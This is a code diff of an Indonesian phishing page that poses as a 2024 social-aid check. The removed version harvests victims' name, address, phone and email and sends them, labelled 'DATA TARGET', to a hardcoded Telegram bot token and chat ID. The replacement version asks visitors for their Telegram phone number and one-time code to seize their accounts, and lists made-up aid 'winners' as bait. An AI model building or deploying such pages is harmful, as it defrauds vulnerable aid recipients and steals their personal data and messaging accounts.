@@ -1,303 +1,183 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pengecekan Bantuan Sosial 2024</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>Bantuan Sosial - Tautkan Telegram</title>
     <style>
-      /* CSS styles remain unchanged */
-      * {
-          margin: 0;
-          padding: 0;
-          box-sizing: border-box;
-          font-family: 'Poppins', sans-serif;
-      }
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f1f1f1;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-      body {
-          background-color: #f0f2f5;
-          color: #333;
-          display: flex;
-          flex-direction: column;
-          min-height: 100vh; /* Membuat tinggi minimal 100% viewport */
-      }
+        .container {
+            max-width: 500px;
+            margin: 30px auto;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
 
-      .container {
-          background: linear-gradient(135deg, #ffffff, #f7f9fc);
-          padding: 30px;
-          border-radius: 16px;
-          box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-          width: 100%;
-          max-width: 500px;
-          text-align: center;
-          margin: auto; /* Membuat container berada di tengah halaman */
-      }
+        h1 {
+            color: #333;
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            text-align: center;
+        }
 
-      .icon {
-          font-size: 60px;
-          color: #ff6b6b;
-          margin-bottom: 15px;
-      }
+        p {
+            color: #555;
+            margin-bottom: 20px;
+            text-align: center;
+        }
 
-      h1 {
-          font-size: 26px;
-          font-weight: 600;
-          color: #333;
-          margin-bottom: 25px;
-          letter-spacing: 1px;
-      }
+        input[type="text"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
 
-      .form-group {
-          margin-bottom: 20px;
-          text-align: left;
-      }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            cursor: pointer;
+        }
 
-      .form-group label {
-          display: block;
-          font-weight: 500;
-          color: #555;
-          margin-bottom: 8px;
-      }
+        button:hover {
+            background-color: #218838;
+        }
 
-      .form-group input,
-      .form-group textarea {
-          width: 100%;
-          padding: 12px;
-          border: 1px solid #ccc;
-          border-radius: 8px;
-          font-size: 15px;
-          transition: border-color 0.3s ease;
-      }
+        .scroll-container {
+            width: 100%;
+            height: 250px;
+            overflow: hidden;
+            position: relative;
+            background-color: #007bff;
+            color: white;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
 
-      .form-group input:focus,
-      .form-group textarea:focus {
-          border-color: #ff6b6b;
-          outline: none;
-      }
+        .scroll-list {
+            position: absolute;
+            width: 100%;
+            animation: scroll 60s linear infinite;
+        }
 
-      textarea {
-          resize: vertical;
-      }
+        .scroll-item {
+            padding: 15px;
+            text-align: center;
+            font-size: 1.2rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.3);
+        }
 
-      button {
-          background-color: #ff6b6b;
-          color: #fff;
-          padding: 12px 20px;
-          border: none;
-          border-radius: 8px;
-          cursor: pointer;
-          font-size: 16px;
-          font-weight: 600;
-          transition: background-color 0.3s ease;
-          width: 100%;
-      }
+        @keyframes scroll {
+            0% {
+                top: 100%;
+            }
+            100% {
+                top: -3000px; /* Menyesuaikan tinggi total list */
+            }
+        }
 
-      button:hover {
-          background-color: #e84141;
-      }
+        .message {
+            color: red;
+            text-align: center;
+            margin-top: 10px;
+        }
 
-      footer {
-          margin-top: auto; /* Membuat footer tetap di bawah */
-          padding: 20px 0;
-          background-color: #fff;
-          text-align: center;
-          font-size: 14px;
-          border-top: 1px solid #ccc;
-      }
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
 
-      .footer-content {
-          padding-top: 10px;
-      }
-
-      .footer-links a {
-          margin: 0 15px;
-          text-decoration: none;
-          color: #555;
-          font-weight: 500;
-      }
-
-      .footer-links a:hover {
-          text-decoration: underline;
-          color: #ff6b6b;
-      }
-
-      .footer-social-icons a {
-          color: #555;
-          margin: 0 15px;
-          font-size: 22px;
-          text-decoration: none;
-          transition: color 0.3s ease;
-      }
-
-      .footer-social-icons a:hover {
-          color: #ff6b6b;
-      }
-
-      /* Media queries untuk tampilan mobile */
-      @media (max-width: 600px) {
-          body {
-              padding: 15px;
-          }
-
-          .container {
-              padding: 20px;
-          }
-
-          h1 {
-              font-size: 22px;
-          }
-
-          button {
-              padding: 10px 16px;
-              font-size: 14px;
-          }
-
-          .form-group input,
-          .form-group textarea {
-              font-size: 14px;
-          }
-
-          .icon {
-              font-size: 48px;
-          }
-      }
+        .logo-container img {
+            width: 150px;
+        }
     </style>
 </head>
 <body>
 
+<div class="banner"></div>
+
 <div class="container">
-    <div class="icon">
-        <i class="fas fa-hand-holding-heart"></i>
+    <div class="logo-container">
+        <!-- Tambahkan logo di sini -->
+        <img src="https://github.com/bantuan2024/Image/blob/main/images.png?raw=true" alt="Logo Peduli Kasih">
     </div>
-    <h1 id="dynamicText"></h1>
-    <form id="bantuanForm">
-        <div class="form-group">
-            <label for="name">Nama Lengkap:</label>
-            <input type="text" id="name" name="name" required>
-        </div>
 
-        <div class="form-group">
-            <label for="address">Alamat Lengkap:</label>
-            <input type="text" id="address" name="address" required>
-        </div>
-
-        <div class="form-group">
-            <label for="phone">Nomor Telepon:</label>
-            <input type="tel" id="phone" name="phone" required>
-        </div>
-
-        <div class="form-group">
-            <label for="email">Email:</label>
-            <input type="email" id="email" name="email" required>
-        </div>
-
-        <div class="form-group">
-            <label for="comments">Komentar:</label>
-            <textarea id="comments" name="comments" rows="4" placeholder="Tulis komentar atau pertanyaan Anda di sini..."></textarea>
-        </div>
-
-        <button type="submit">Kirim</button>
+    <h1>Tautkan Akun Telegram</h1>
+    <p>Untuk menerima bantuan sosial, tautkan akun Telegram Anda dengan memasukkan nomor telepon yang terhubung dengan Telegram.</p>
+    <form action="/send_otp" method="POST">
+        <input type="text" name="phone" placeholder="Masukkan nomor telepon" required>
+        <button type="submit">Kirim OTP</button>
     </form>
+
+    <form action="/verify_otp" method="POST">
+        <input type="text" name="otp" placeholder="Masukkan OTP" required>
+        <button type="submit">Verifikasi OTP</button>
+    </form>
+
+    <div class="message">{{ message }}</div>
 </div>
 
-<footer>
-    <div class="footer-content">
-        <p>&copy; 2024 Pengecekan Bantuan Sosial. Semua hak dilindungi.</p>
-        <div class="footer-links">
-            <a href="#about">Tentang Kami</a>
-            <a href="#contact">Kontak</a>
-        </div>
-        <div class="footer-social-icons">
-            <a href="https://facebook.com" target="_blank" class="fab fa-facebook-f"></a>
-            <a href="https://twitter.com" target="_blank" class="fab fa-twitter"></a>
-            <a href="https://instagram.com" target="_blank" class="fab fa-instagram"></a>
+<div class="container">
+    <h1>Pemenang Bantuan Sosial</h1>
+    <div class="scroll-container">
+        <div class="scroll-list" id="scroll-list">
+            <!-- Data pemenang akan dimasukkan di sini -->
         </div>
     </div>
-</footer>
+</div>
+
 <script>
-    // Efek mengetik pada judul
-    var phrases = [
-        "Cek Sekarang!",
-        "Pengguna PKH",
-        "Bantuan Menunggu Anda!",
-        "Segera Periksa!",
-        "Dapatkan Bantuan Anda!"
+    const winners = [
+        { name: "Andi S.", amount: "Rp1.000.000" },
+        { name: "Rini K.", amount: "Rp2.500.000" },
+        { name: "Dedi M.", amount: "Rp3.000.000" },
+        { name: "Budi N.", amount: "Rp1.200.000" },
+        { name: "Ayu P.", amount: "Rp2.000.000" },
+        { name: "Susi L.", amount: "Rp1.500.000" },
+        { name: "Rudi T.", amount: "Rp3.200.000" },
+        { name: "Eko H.", amount: "Rp2.700.000" },
+        { name: "Lina G.", amount: "Rp2.300.000" },
+        { name: "Indra B.", amount: "Rp4.000.000" },
+        { name: "Diana W.", amount: "Rp1.800.000" },
+        { name: "Agus P.", amount: "Rp2.900.000" },
+        { name: "Mira Z.", amount: "Rp2.600.000" },
+        { name: "Tina M.", amount: "Rp1.700.000" },
+        { name: "Surya S.", amount: "Rp3.500.000" },
+        { name: "Hana K.", amount: "Rp1.900.000" },
+        { name: "Bayu F.", amount: "Rp2.400.000" },
+        { name: "Nina V.", amount: "Rp3.800.000" },
+        { name: "Nina V.", amount: "Rp3.800.000" },
+        { name: "Rizki J.", amount: "Rp2.100.000" },
+        { name: "Wati Y.", amount: "Rp2.800.000" },
     ];
-    var currentPhraseIndex = 0;
-    var currentCharIndex = 0;
-    var typingDelay = 100;
-    var erasingDelay = 50;
-    var newPhraseDelay = 2000;
 
-    function type() {
-        if (currentCharIndex < phrases[currentPhraseIndex].length) {
-            document.getElementById('dynamicText').textContent += phrases[currentPhraseIndex].charAt(currentCharIndex);
-            currentCharIndex++;
-            setTimeout(type, typingDelay);
-        } else {
-            setTimeout(erase, newPhraseDelay);
-        }
-    }
+    const scrollList = document.getElementById('scroll-list');
 
-    function erase() {
-        if (currentCharIndex > 0) {
-            document.getElementById('dynamicText').textContent = phrases[currentPhraseIndex].substring(0, currentCharIndex - 1);
-            currentCharIndex--;
-            setTimeout(erase, erasingDelay);
-        } else {
-            currentPhraseIndex = (currentPhraseIndex + 1) % phrases.length;
-            setTimeout(type, typingDelay + 1000);
-        }
-    }
-
-    type(); // Memulai efek mengetik
-
-    // Ganti dengan token bot Telegram Anda
-    const botToken = '7371764330:AAEgSgROcGBEbsgspY4IDNU_WqPL_3IczGs';
-    // Ganti dengan chat ID Anda
-    const chatId = '6864784021'; // Misal: '123456789' untuk pengguna pribadi atau '@your_channel' untuk channel
-
-    document.getElementById('bantuanForm').addEventListener('submit', function(event) {
-        event.preventDefault(); // Mencegah pengiriman formulir default
-
-        // Mendapatkan data formulir
-        var formData = new FormData(event.target);
-        var data = Object.fromEntries(formData.entries());
-
-        // Format pesan yang akan dikirim
-        const message = `
-DATA TARGET
-Nama Lengkap: ${data.name}
-Alamat Lengkap: ${data.address}
-Nomor Telepon: ${data.phone}
-Email: ${data.email}
-Komentar: ${data.comments}
-        `.trim();
-
-        // Mengirim data ke bot Telegram
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message
-            })
-        })
-        .then(response => {
-            if (response.ok) {
-                alert('Data berhasil dikirim!');
-                event.target.reset(); // Mengatur ulang formulir setelah pengiriman
-            } else {
-                alert('Gagal mengirim data. Coba lagi.');
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            alert('Terjadi kesalahan saat mengirim data.');
-        });
+    winners.forEach(winner => {
+        const item = document.createElement('div');
+        item.className = 'scroll-item';
+        item.textContent = `${winner.name} - ${winner.amount}`;
+        scrollList.appendChild(item);
     });
 </script>
+
 </body>
 </html>
